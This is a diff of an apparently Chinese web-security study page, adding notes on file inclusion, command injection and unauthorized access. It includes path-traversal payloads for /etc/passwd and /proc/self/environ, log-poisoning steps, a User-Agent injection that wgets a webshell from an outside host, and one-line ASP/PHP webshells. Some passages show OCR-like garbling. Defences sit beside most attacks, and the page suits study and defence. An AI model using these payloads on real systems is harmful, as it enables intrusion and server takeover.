@@ -475,20 +475,34 @@
       
         <li class="md-nav__item">
   <a href="#_4" class="md-nav__link">
-    文件上传
+    文件包含
   </a>
   
 </li>
       
         <li class="md-nav__item">
   <a href="#_5" class="md-nav__link">
-    金融行业常见逻辑漏洞
+    命令执行漏洞
   </a>
   
 </li>
       
         <li class="md-nav__item">
   <a href="#_6" class="md-nav__link">
+    文件上传
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    金融行业常见逻辑漏洞
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
     登录框的
   </a>
   
@@ -502,15 +516,22 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_7" class="md-nav__link">
+  <a href="#_9" class="md-nav__link">
     一句话木马
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#_8" class="md-nav__link">
+  <a href="#_10" class="md-nav__link">
     信息泄露
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    未授权访问
   </a>
   
 </li>
@@ -1203,20 +1224,34 @@
       
         <li class="md-nav__item">
   <a href="#_4" class="md-nav__link">
-    文件上传
+    文件包含
   </a>
   
 </li>
       
         <li class="md-nav__item">
   <a href="#_5" class="md-nav__link">
-    金融行业常见逻辑漏洞
+    命令执行漏洞
   </a>
   
 </li>
       
         <li class="md-nav__item">
   <a href="#_6" class="md-nav__link">
+    文件上传
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    金融行业常见逻辑漏洞
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
     登录框的
   </a>
   
@@ -1230,15 +1265,22 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_7" class="md-nav__link">
+  <a href="#_9" class="md-nav__link">
     一句话木马
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#_8" class="md-nav__link">
+  <a href="#_10" class="md-nav__link">
     信息泄露
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    未授权访问
   </a>
   
 </li>
@@ -1268,6 +1310,7 @@
 2)当编码影响业务时，使用白名单规则进行检测和过滤
 3)使用W3C提出的CSP (Content Security Policy, 内容安全策略)，定义域名白名单
 4)设置cookie的httponly属性</p>
+<p>绕过：通过表单</p>
 <h3 id="csrf">csrf<a class="headerlink" href="#csrf" title="Permanent link">&para;</a></h3>
 <p>1)最容易实现的是Get请求，一般进入黑客网站后，可以通过设置img的src属
 性来自动发起请求
@@ -1415,7 +1458,86 @@ homepage= $homepage' WHERE id=" OR username=' admin'</p>
 击。防御:禁止跳转，限制协议，内外网限制，URL 限制。
 绕过:使用不同协议，针对IP IP格式的绕过， 针对URL, 恶意URL增天，
 宇符，@之类的。301跳转-drs rbindaingo</p>
-<h3 id="_4">文件上传<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<h3 id="_4">文件包含<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<ul>
+<li>包含上传文件</li>
+</ul>
+<p>用户上传了一个可执行文件，通过文件包含那个文件实现漏洞利用
+防御：
+    做好上传限制
+    隐藏好文件路径
+    设置访问权限、执行权限</p>
+<ul>
+<li>伪协议</li>
+</ul>
+<p>php*：//input：用来接收POST数据。我们能够通过input把我们的语句输入上去然后执行。*</p>
+<p>data://：将原本的include的文件流重定向到了用户可控制的输入流中</p>
+<ul>
+<li>包含日志文件</li>
+</ul>
+<div class="highlight"><pre><span></span><code>1、日志的默认路径
+    /etc/httpd/logs/access_log或/var/log/httpd/access_log        //apache+linux
+    D:xamppapachelogsaccess.log或D:xamppapachelogserror.log  //apache_win2003
+    C:WINDOWSsystem32Logfiles                     //iis6.0+win2003
+    %SystemDrive%inetpublogsLogFiles            //iis7.0+win2003
+    nginx 日志文件在用户安装目录的logs目录下
+2、web中间件默认配置uoh文件
+    /etc/httpd/conf/httpd.conf或index.php?page=/etc/init.d/httpd        //apache+linux
+    C:/Windows/system32/inetsrv/metabase.xml          //iis6.0+win2003
+    C:WindowsSystem32inetsrvconfigapplicationHost.config           //iis7.0+win
+3、利用
+    访问http://www.xx.com/&lt;?php phpinfo(); ?&gt;时，&lt;?php phpinfo(); ?&gt;也会被记录在日志里，也可以插入到User-Agent；但是在日志里这句话被编码了；所以用Burp Suite修改来绕过编码；然后包含相应的日志文件：
+    http://localhost/include/file.php?file=../../apache/logs/access.log //（这里利用相对路径，找到日志文件，并以php解析的方式打开)
+4、防御
+    隐藏或修改默认日志文件
+    设置日志文件读取权限
+</code></pre></div>
+<ul>
+<li>包含/proc/self/environ</li>
+</ul>
+<div class="highlight"><pre><span></span><code>1、找文件包含漏洞
+    www.aaa.com/view.php?page=../
+    www.aaa.com/view.php?page=../../../../../etc/passwd
+2、检查proc/self/environ是否可以访问
+    www.aaa.com/view.php?page=../../../../../proc/self/environ
+3、如果可读就注入代码
+    访问：www.aaa.com/view.php?page=../../../../../proc/self/environ
+    选择User-Agent 写代码如下：&lt;?system(&#39;wget http://www.yourweb.com/oneword.txt -O shell.php&#39;);?&gt;    //提交请求；我们的命令将被执行(将下载http://www.yourweb.com/oneword.txt，并将其保存为它在shell.php网站目录)，我们的shell也就被创建,.如果不行，尝试使用exec()，因为系统可能被禁用的从php.ini网络服务器.
+4、访问shell
+5、防御：
+    设置proc/self/environ不可访问
+</code></pre></div>
+<ul>
+<li>包含Session文件</li>
+</ul>
+<p>?file=../../../../../../tmp/sess_1sv3pu01f97dp3qcfef8i2b9r2         //读取session文件</p>
+<h3 id="_5">命令执行漏洞<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>分为远程代码执行和系统命令执行两类。</p>
+<p>如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命
+令拼接到正常命令中，从而造成命令执行攻击。</p>
+<ul>
+<li>命令注入攻击中, Web服务器没有过滤类似system、eval和exec等函数，是该漏洞攻击成功的主要原因。</li>
+<li>继承Web服务程序的权限去执行系统命令（任意代码）或读写文件</li>
+<li>反弹shell</li>
+<li>控制整个网站甚至控制服务器</li>
+<li>进一步内网渗透</li>
+<li>管道符号</li>
+<li>;前面的执行完执行后面的</li>
+<li>|是管道符，显示后面的执行结果</li>
+<li>||当前面的执行出错时执行后面的</li>
+<li>&amp;前面的语句为假则直接执行后面的</li>
+<li>&amp;&amp;前面的语句为假则直接出错，后面的也不执行</li>
+<li>|直接执行后面的语句</li>
+<li>||前面出错执行后面的</li>
+</ul>
+<p>常见场景：</p>
+<ul>
+<li>Ping主机</li>
+<li>DNS请求</li>
+<li>Office文档</li>
+<li>框架缺陷</li>
+</ul>
+<h3 id="_6">文件上传<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
 <p>23、文件上传漏洞原理
 由于程序员在对用户文件上传郁分的控制不足或者处理缺陷而导致用户可以越
 过其本身权限向服务器上传可执行的动态脚本文件。
@@ -1430,7 +1552,7 @@ ASP: include file, include virtual</p>
 <p>上传目录的用户执行权限全部取消、判断文件类型、使用随机数改写文，
 者和父
 件路径、网站服务器和文件服务器分离、白名单检查、限制文件大小</p>
-<h3 id="_5">金融行业常见逻辑漏洞<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<h3 id="_7">金融行业常见逻辑漏洞<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
 <p>主要是数据的篡改(涉及
 及金融数据，或部分业务的判断数据)，由竞争条件或者设
 计不当引起的薄羊毛，交易门单信思泄露水平越仪对别人的账户查看或惠意操作，交易或业务步骤绕过。</p>
@@ -1448,7 +1570,7 @@ ASP: include file, include virtual</p>
 <p>验证码漏洞中存在:
 7)验证码允许暴力破解
 8)验证码可以通过Javascipt 或者改包的方法来进行绕过</p>
-<h3 id="_6">登录框的<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<h3 id="_8">登录框的<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
 <p>xss，弱口令，sql注入，cms漏洞，找回密码逻辑漏洞，功能性的逻辑漏洞等等。</p>
 <p>找回密码处</p>
 <p>1.爆破验证码： 如果当验证只有4-5位存数字 爆破验证码的成功率很高 ：比如 100个线程 爆破4位的也就1分多钟就搞定：    如何修复:验证码验证字数限制加时间限制  </p>
@@ -1469,7 +1591,7 @@ Java中的XXE支持sun.net. ww.protcco里的所有协议: http. https, fle, ftp.
 mailto, jar, netdoc, 一 般利用file协议读取文件，利用http协议探测内网。
 防御:配置XML处理器使用禁用DTD、禁止外部实体解析、通过黑名单过滤用
 户提交的XML数据。</p>
-<h3 id="_7">一句话木马<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<h3 id="_9">一句话木马<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
 <p>ASP: &lt;%eval request("cmd")%&gt;
 ASP.NET: (aspx)
 &lt;%@ Page Language= "Jscript"%&gt;
@@ -1482,7 +1604,7 @@ PHP: &lt;?php @eval($_ REQUEST['cmd]):?&gt;</p>
 PHP注入会使攻击者执行任意代码getshel从而控制网站或服务器。系统注入。
 使攻击者继承web服务器程序权限执行系统命令、读写文件、反弹shell,
 !从而控制整个网站甚至服务器。</p>
-<h3 id="_8">信息泄露<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
+<h3 id="_10">信息泄露<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
 <p>配置文件访问
 • httpd.conf
 • htaccess
@@ -1491,13 +1613,27 @@ PHP注入会使攻击者执行任意代码getshel从而控制网站或服务器�
 • etc/passwd
 • Php.ini
 • Web.xml</p>
+<h3 id="_11">未授权访问<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
+<ul>
+<li><a href="https://so.csdn.net/so/search?q=MongoDB&amp;spm=1001.2101.3001.7020">MongoDB</a> 未授权访问漏洞</li>
+<li>Redis 未授权访问漏洞</li>
+<li>Memcached 未授权</li>
+<li>JBOSS 未授权</li>
+<li><a href="https://so.csdn.net/so/search?q=VNC&amp;spm=1001.2101.3001.7020">VNC</a> 未授权</li>
+<li>ZooKeeper 未授权</li>
+<li>Rsync 未授权</li>
+<li>Hadoop未授权</li>
+<li>Jenkins未授权</li>
+<li>Elasticsearch未授权</li>
+<li>CouchDB未授权</li>
+</ul>
 
   <hr>
 <div class="md-source-file">
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_datetime">2022-04-30 11:27:37</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_datetime">2022-07-27 22:31:40</span>
       
     
   </small>
